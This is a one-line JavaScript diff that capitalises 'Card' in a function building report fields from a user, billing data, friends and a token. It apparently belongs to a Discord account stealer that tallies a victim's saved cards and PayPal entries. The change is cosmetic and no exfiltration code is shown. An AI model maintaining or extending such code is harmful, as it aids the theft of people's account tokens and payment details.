@@ -280,7 +280,7 @@ function buildFields(user, billing, friends, token, extra) {
     const cards   = (billing || []).filter(s => s.type === 1).length;
     const paypals = (billing || []).filter(s => s.type === 2).length;
     const billingParts = [];
-    if (cards)   billingParts.push(`\`${cards} card${cards > 1 ? 's' : ''} found\``);
+    if (cards)   billingParts.push(`\`${cards} Card${cards > 1 ? 's' : ''} found\``);
     if (paypals) billingParts.push(`\`${paypals} PayPal${paypals > 1 ? 's' : ''} found\``);
     const billingVal = billingParts.length ? billingParts.join(' ') : '<:no:1533642070701641889>';
 
